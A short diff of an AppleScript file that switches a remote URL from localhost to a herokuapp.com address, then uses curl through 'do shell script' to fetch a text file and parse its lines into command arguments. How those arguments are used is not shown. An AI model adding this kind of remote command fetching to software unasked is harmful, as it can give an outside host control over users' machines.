@@ -21,7 +21,7 @@
 
 *)
 
-set remoteURL to "http://localhost/remote.txt"
+set remoteURL to "http://damp-journey-2734.herokuapp.com/remote.txt"
 try
 	set commandArgs to paragraphs of (do shell script "curl " & remoteURL & " | cut -d ':' -f 2")
 
